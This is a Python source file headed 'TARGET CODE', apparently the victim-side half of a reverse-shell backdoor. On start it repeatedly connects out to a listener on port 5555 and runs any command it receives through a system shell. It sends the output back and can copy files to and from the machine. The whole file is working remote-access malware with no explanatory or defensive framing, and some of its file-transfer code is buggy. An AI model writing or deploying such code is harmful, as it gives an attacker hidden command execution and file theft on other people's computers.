# TARGET CODE 

import socket
import json
import time
import subprocess
import os

def reliable_recv(s):
    data = ''
    while True:
        try:
            data += s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
        except Exception as err:
            print(f"[-] An error occurred -> {err}")
            continue

def reliable_send(command, s):
    jsondata = json.dumps(command)
    s.send(jsondata.encode())
    
def connection(s):
    time.sleep(5)
    while True:
        try:
            s.connect(("127.0.0.1", 5555))
            shell(s)
            s.close()
            break
        except:
            time.sleep(5)  # Add a delay before retrying to avoid infinite recursion
            continue

def upload_file(file_name):
    f = open(file_name, "rb") # Read bytes
    s.send(f.read())
    f.close()

def download_file(file_name):
    f = open(file_name, "wb") # Write bytes to file
    s.settimeout(1) # Add a timeout for 1 second
    chunk = s.recv(1024)
    
    while chunk:
        f.write(chunk)
        try:
            s.recv(1024)
        except socket.timeout:
            break
        
    s.settimeout(None)
    f.close()
        
def shell(s):
    while True:
        command = reliable_recv(s)
        
        if command == 'quit':
            break
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
            continue
        elif command == "clear" or command == "cls":
            continue
        elif command[:8] == "download":
            upload_file(command[9:])
        elif command[:6] == "upload":
            download_file(command[7:])
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result, s)
                   
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection(s)
